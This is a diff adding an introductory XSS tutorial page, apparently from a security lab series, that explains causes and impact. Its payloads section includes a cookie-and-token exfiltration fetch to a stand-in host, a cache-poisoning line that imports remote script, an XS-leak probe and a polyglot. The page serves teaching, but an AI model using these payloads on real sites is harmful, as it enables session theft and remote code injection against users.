@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Introduction</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/00-introduction</span></div>
+<main class="wrap">
+    <h1>What is XSS?</h1>
+    <p>Cross-Site Scripting (XSS) lets an attacker run JavaScript in someone else’s browser. That script runs in the victim’s session, so it can steal cookies, log keystrokes, or perform actions on their behalf.</p>
+
+    <h2>Why it happens</h2>
+    <ul>
+        <li>HTML is a streaming parser — it will render half-broken tags instead of throwing errors.</li>
+        <li>Developers treat user input as <em>text</em> but the browser treats it as <em>structure</em>.</li>
+        <li>No context-aware encoding = quote-break or tag-injection possible.</li>
+    </ul>
+
+    <h2>Where you’ll meet it</h2>
+    <p>Search boxes, comment fields, username display, error pages, SPA URL fragments, JSONP callbacks, PDF metadata, even SVG avatars.</p>
+
+    <h2>Impact beyond alert()</h2>
+    <p>Silent cookie steal, wallet drain, webcam/mic access, key-logging, supply-chain back-door (see 2023 Polyfill.io incident).</p>
+
+    <h2>Mini case-study</h2>
+    <p>HackerOne report #1882283 — Shopify CDN cached a reflected payload, turning it into stored XSS for 2 h, stealing staff sessions.</p>
+
+    <h2>Payloads</h2>
+    <!-- Silent exfil -->
+    <pre>// 1. Steal cookies + localStorage + UA in one shot <code>
+fetch('//att/steal',{
+  method:'POST',
+  body:document.cookie+'\n'+localStorage.token+'\n'+navigator.userAgent
+});</code></pre>
+
+    <!-- Cache poison -->
+    <pre>// 2. Poison browser cache so every visitor loads evil JS<code>
+caches.open('v1').then(c=>c.put('/js/app.js',new Response('import("//att/evil.mjs")')));</code></pre>
+
+    <!-- XS-Leak -->
+    <pre>// 3. 1-bit leak per image load (CSP blocks img but error fires)<code>
+&lt;img src="https://target.com/account/123" onerror="leak(1)" onload="leak(0)"&gt;</code></pre>
+
+    <!-- Polyglot -->
+    <pre>// 4. Works in HTML, SVG, CSS, JS context<code>
+jaVasCript:/*-->&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;"&gt;&lt;svg onload='/*&lt;img src=x onerror=*/alert(1)//'&gt;</code></pre>
+
+    <h3>Further reading</h3>
+    <ul>
+        <li><a href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting" style="color:var(--cyan)">MDN — XSS</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/xss/" style="color:var(--cyan)">OWASP — XSS</a></li>
+    </ul>
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
